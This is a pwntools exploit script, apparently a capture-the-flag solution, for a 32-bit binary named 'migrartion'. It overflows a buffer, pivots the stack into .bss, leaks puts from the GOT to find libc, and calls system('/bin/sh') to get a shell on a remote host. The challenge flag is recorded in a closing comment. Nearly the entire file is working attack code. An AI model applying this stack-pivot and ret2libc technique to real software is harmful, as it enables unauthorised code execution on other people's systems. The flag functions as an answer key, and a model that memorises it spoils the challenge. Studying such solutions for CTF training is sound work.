#!/usr/bin/env

from pwn import *
import time


mir = ELF('./migrartion')
lib = ELF('./libc.so.6-32')

r = remote('192.168.31.25',11555)
#r = process('./migrartion')

leave_ret = 0x080484f3
pop_ret = 0x08048339

# Step 1 : write to first stack and leave_ret 

padding = 'A'*48
payload1 = padding + p32(mir.bss()+0x300)        #ebp
payload1 += p32(mir.plt['read']) + p32(leave_ret) + p32(0) + p32(mir.bss()+ 0x300) + p32(0x100)

# Step 2 : leak address and write to second stack and leave_ret

payload2 = ''
payload2 += p32(mir.bss()+0x600) 
payload2 += p32(mir.plt['puts']) + p32(pop_ret) + p32(mir.got['puts']) 
payload2 += p32(mir.plt['read']) + p32(leave_ret) + p32(0) + p32(mir.bss()+ 0x600) + p32(0x100)

r.recvuntil(':\n')
r.send(payload1)
print 'bss =',hex(mir.bss())
time.sleep(0.3)
r.send(payload2)
libc_puts = r.recv(numb=4)
libc_puts = u32(libc_puts)
lib_base = libc_puts - lib.symbols['puts']
lib_sys = lib_base + lib.symbols['system']
lib_sh = lib_base + list(lib.search('/bin/sh'))[0]
print 'puts_add =',hex(libc_puts)
print 'libc_base =',hex(lib_base)
print 'lib_sys =',hex(lib_sys)
print 'lib_sh =',hex(lib_sh)


# Step 3 : give the address and execv

payload3 = ''
payload3 += p32(mir.bss()+0x300)
payload3 += p32(lib_sys) + 'A'*4 + p32(lib_sh)
r.send(payload3)


r.interactive()


#AD{st4ck_m1gr471on_1s_v3ry_us3fU1}

